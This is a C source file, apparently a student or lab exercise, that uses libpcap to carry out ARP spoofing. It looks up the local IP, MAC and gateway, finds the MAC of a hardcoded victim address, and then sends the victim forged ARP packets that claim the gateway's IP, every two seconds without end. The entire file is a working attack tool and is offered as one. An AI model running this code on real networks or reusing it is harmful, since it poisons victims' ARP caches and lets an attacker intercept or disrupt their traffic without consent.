#include <pcap.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <errno.h>
#include <arpa/inet.h>
#include <net/ethernet.h>
#include <netinet/udp.h>
#include <net/if_arp.h>    // For changing if_arp.h, we can use arp header.
#include <regex.h>
#include <unistd.h>

void chMac(unsigned char * macAddr, unsigned char mac_bytes[]);
void shellcmd(char * cmd, char result[]);
void my_regexp(char * src, char * pattern, unsigned char matched[]);

int main(int argc, char * argv[])
{
    char *dev;
    bpf_u_int32 netp;
    char errbuf[PCAP_ERRBUF_SIZE];
    struct bpf_program fp;
    pcap_t *pcd;  // packet capture descriptor
    char  pszCommand[100];

    char * ipconfig = (char *)malloc(1024);
    char * iproute = (char *)malloc(1024);

    dev = pcap_lookupdev(errbuf);

    if (dev == NULL)
    {
        printf("%s\n", errbuf);
        exit(1);
    }

    printf("Interface : %s\n", dev); // get device name

    /* variables : attacker mac address, attacker IP address, gateway Ip address */

    unsigned char * atkMacAddr = (unsigned char *)malloc(50); // aa:aa:aa:aa:aa:aa
    unsigned char * atkIpAddr = (unsigned char *)malloc(50);; // 192.168.xxx.xxx
    unsigned char * gateIpAddr = (unsigned char *)malloc(50); // 192.168.xxx.xxx

    /****************************************/




    /* variables : regular expression pattern */

    char * mac_pat = "\\([0-9a-f]\\{2\\}:\\)\\{5\\}[0-9a-f]\\{2\\}";   // ([\da-f]{2}:){5}[\da-f]{2}
    char * ip_pat = "\\([0-9]\\{1,3\\}\\.\\)\\{3\\}[0-9]\\{1,3\\}";    // ([\d]{1,3}\.){3}[\d]{1,3}
    char * gate_pat = "\\([0-9]\\{1,3\\}\\.\\)\\{3\\}[0-9]\\{1,3\\}";  // ([\d]{1,3}\.){3}[\d]{1,3}

    /****************************************/



    /* Input shell command "ipconfig device" */

    sprintf(pszCommand, "ifconfig %s", dev);
    shellcmd(pszCommand, ipconfig);

    /****************************************/


    /* With result of ipconfig, by using regular exrpession
     * Get IP address and MAC address */

    my_regexp(ipconfig, mac_pat, atkMacAddr);
    my_regexp(ipconfig, ip_pat, atkIpAddr);

    /***********************************************************/


    /* Input shell command "ip route" for getting gateway address.
     * and using regular expression, get gateway address. */

    strcpy(pszCommand, "ip route");
    shellcmd(pszCommand, iproute);

    my_regexp(iproute, gate_pat, gateIpAddr);


    /***********************************************************/



    puts("");


    /* variables : attacker mac address, attacker IP address, gateway Ip address
     * These things are BYTE array for sending packet */

    struct in_addr atk_addr;
    struct in_addr vic_addr;
    struct ether_header ether;
    struct arphdr arp_hdr;

    /*****************************************************************************/


    unsigned char packet[1500]; // Packet will contain ARP request and be sent.

    int len; // length of packet

    unsigned char mac_bytes[6]; // temporary mac storage.


    /* 192.168.xxx.xxx -> byte array */

    inet_pton(AF_INET, (char *)atkIpAddr , &atk_addr.s_addr);
    inet_pton(AF_INET, "192.168.32.65", &vic_addr.s_addr);

    /*********************************/


    chMac((unsigned char *)atkMacAddr, (unsigned char *)mac_bytes);  // aa:bb:cc:dd:ee:ff -> byte array;

    /* Initialize ethernet header and ARP header for ARP request */

    memset((void *)ether.ether_dhost , 0xFF, 6);
    memcpy((void *)ether.ether_shost, (void *)mac_bytes, 6);


    ether.ether_type = htons(ETHERTYPE_ARP);

    arp_hdr.ar_hrd = 0x0100;
    arp_hdr.ar_pro = 0x0008;
    arp_hdr.ar_hln = 0x06;
    arp_hdr.ar_pln = 0x04;
    arp_hdr.ar_op = 0x0100;

    memcpy((void *) arp_hdr.__ar_sha, (void*) mac_bytes, 6);
    memset((void *) arp_hdr.__ar_tha, 0, 6);

    memcpy((void *) arp_hdr.__ar_sip, (void*) &(atk_addr.s_addr), 4);
    memcpy((void *) arp_hdr.__ar_tip, (void*) &(vic_addr.s_addr), 4);

    /***************************************************************/



    /* Construct real packet for sending ARP request */

    memcpy((void*)packet, (void *)&ether, sizeof(ether));
    len = sizeof(ether);

    memcpy((void*)(packet + len), (void *)&arp_hdr, sizeof(arp_hdr));
    len += sizeof(arp_hdr);

    /**************************************************/


    unsigned char * vicMacAddr = (unsigned char *) malloc(50); // victim's mac address
    int res;
    struct pcap_pkthdr *header;
    const unsigned char *pkt_data;  // After ARP request, this value contains the response


    /* capturing victim's mac phase by sending ARP request and receive ARP reply */

    pcd = pcap_open_live(dev, BUFSIZ,  1, -1, errbuf);

    if (pcap_compile(pcd, &fp, NULL, 0, netp) == -1)
    {
        printf("compile error\n");
        exit(1);
    }

    if (pcap_setfilter(pcd, &fp) == -1)
    {
        printf("setfilter error\n");
        exit(0);
    }


    pcap_sendpacket(pcd,packet,len); // send ARP request to get the victim's reponse!


    while((res=pcap_next_ex(pcd, &header,&pkt_data))>=0)
    {
            if (res==0) continue;
            
            if(!memcmp(pkt_data + sizeof(ether) + 14, (void*)&vic_addr.s_addr, 4)) // If VICTIM's IP of the ARP request matches with sender IP of ARP reply
            {
                memcpy((void *)mac_bytes, (void *)(pkt_data + 6), 6);
                printf("CAPTURED VICTIM'S MAC ADDRESS\n");
                break;
            }
    }
    printf("Victim's Mac Address : ");
    for(int i = 0 ; i < 6 ; i++)
        printf("%02x", mac_bytes[i]);  // print Victim's Mac Adress


    /***************************************************************************/



    /* Change 'packet' variable for making ARP Spoofing Packet */

    struct in_addr gateway_addr; // for gateway byte array


    inet_pton(AF_INET, (char *)gateIpAddr, &gateway_addr.s_addr);                          // get gateway IP by network byte order.

    memcpy((void *)(packet + sizeof(ether) + 14), (void *)&(gateway_addr.s_addr) , 4);     // just change ARP SENDER IP into GATEWAY IP;
    memcpy((void *)(packet), (void *) mac_bytes, sizeof(ether.ether_dhost));               // just change MAC dst into VICTIM dst;


    printf("\nATTACKER IP : %s\n", atkIpAddr);
    printf("ATACKER MAC : %s\n", atkMacAddr);
    printf("GATEWAY IP : %s\n", gateIpAddr);

    /***************************************************************************/


    /* Then, ARP Spoofing packet is ready for arp poisoning using ARP REQUEST.
     * Now The only sending ARP Spoofing packet remained                       */


    while(1)
    {
        pcap_sendpacket(pcd,packet,len);
        sleep(2);
    }

    /***************************************************************************/


    free(ipconfig);
    free(iproute);
    free(atkIpAddr);
    free(atkMacAddr);
    free(gateIpAddr);
    free(vicMacAddr);

    pcap_close(pcd);

}

void chMac(unsigned char * macAddr, unsigned char mac_bytes[]) // chaning aa:bb:cc:dd:ee:ff -> network byte order
{
    char tmp[3];
    for(int i = 0 ; i < 6; i++)
    {
        strncpy(tmp,(char *)macAddr,2);
        tmp[2] = 0;
        mac_bytes[i] = (char)strtoul(tmp, NULL,16);
        macAddr += 3;
    }

}
void shellcmd(char * cmd, char result[]) // result contains the result of shell command.
{
    FILE * pp = popen(cmd, "r");
    int readSize;

    if(!pp)
    {
        printf("popen error");
        exit(1);
    }

    readSize = fread((void*)result, sizeof(char), 1023, pp);

    if(readSize == 0)
    {
        pclose(pp);
        printf("readSize error");
        exit(1);
    }

    pclose(pp);
    result[readSize] = 0;


}


void my_regexp(char * src, char * pattern, unsigned char matched[]) // regular expression
{
    regex_t regex;
    regmatch_t pmatch;
    int reti;


    /* Compile regular expression */

    reti = regcomp(&regex, pattern, 0);

    if( reti ){ printf("Could not compile regex\n"); exit(1); }

    /* Execute regular expression */

    if(!(reti = regexec(&regex, src, 1, &pmatch, 0))){
        int len = pmatch.rm_eo - pmatch.rm_so;
        strncpy((char *)matched, src+pmatch.rm_so, len);
        matched[len] = 0;
    }

}


void chtoMac(const u_char * mac) // change mac address from byte_array to AA:BB:CC:DD:FF:GG
{
    for(int i = 0 ; i < 5 ; i++)
    {
        printf("%02x:", *mac);
        mac++;
    }
    printf("%02x\n", *mac);

}

